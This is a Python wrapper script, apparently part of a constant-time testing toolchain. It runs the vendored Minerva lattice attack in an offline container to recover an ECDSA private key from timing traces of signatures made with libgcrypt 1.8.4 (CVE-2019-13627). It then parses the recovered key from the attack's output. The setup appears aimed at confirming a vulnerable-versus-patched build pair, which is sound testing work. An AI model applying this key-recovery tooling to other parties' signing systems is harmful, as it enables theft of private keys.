#!/usr/bin/env python3
"""Recover the ECDSA private key from committed libgcrypt Minerva observations.

runtime = image. The observations are real libgcrypt signatures: each trace is
(r, s, cycles) rows timed on this host with rdtscp while the pinned libgcrypt
build signed a fixed digest under random per-signature nonces (see acquire/). The
vulnerable build is libgcrypt 1.8.4, whose scalar multiplication's running time
leaks the nonce bit-length (CVE-2019-13627); the patched build is 1.8.5. This
wrapper runs the vendored upstream Minerva lattice attack (pinned in
vendor/COMMIT) inside the recovery image and returns the recovered scalar as hex
or None. It reads only public material and (r, s, time) triples; the private key
is nowhere in its inputs, and the attack reports success only when its guess
reproduces the trace's own public key (d*G == Q).
"""
from __future__ import annotations
import argparse, pathlib, re, subprocess, sys, tempfile, zlib

HERE = pathlib.Path(__file__).resolve().parent
PAIR = HERE.parent
REPO = PAIR.parent.parent
IMAGE = "localhost/ct-toolchain/minerva-recover:1"


def recover_from(trace: pathlib.Path, curve="secp256r1", hash="sha256",
                 timeout=1800) -> str | None:
    """Return the recovered scalar (hex, no 0x) or None."""
    work = pathlib.Path(tempfile.mkdtemp(prefix="libgcrypt-minerva-"))
    csv = work / "sigs.csv"
    csv.write_bytes(zlib.decompress(trace.read_bytes()))
    try:
        # ec.py lives in the image (it incorporates GPL tinyec and is kept out of
        # the MIT tree). Stage it beside the vendored MIT attack.py in a writable
        # work dir so `from ec import ...` resolves.
        r = subprocess.run(
            ["podman", "run", "--rm", "--network=none",
             "-v", f"{PAIR}/vendor/attack:/attack:ro,Z",
             "-v", f"{work}:/work:rw,Z", "-w", "/work",
             IMAGE, "sh", "-c",
             "cp /attack/attack.py /attack/__init__.py /attack/params.json /work/ "
             "&& cp /opt/ec.py /work/ "
             f"&& python3 attack.py {curve} {hash} /work/sigs.csv"],
            capture_output=True, text=True, timeout=timeout)
    except subprocess.TimeoutExpired:
        return None
    finally:
        import shutil; shutil.rmtree(work, ignore_errors=True)
    m = re.search(r"FOUND PRIVATE KEY \*\*\* : 0x([0-9a-f]+)", r.stdout)
    return m.group(1).zfill(64) if m else None


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--trace", required=True)
    ap.add_argument("--curve", default="secp256r1")
    ap.add_argument("--hash", default="sha256")
    a = ap.parse_args()
    key = recover_from(pathlib.Path(a.trace), a.curve, a.hash)
    if key is None:
        print("no key recovered")
        return 1
    print(f"recovered: {key}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
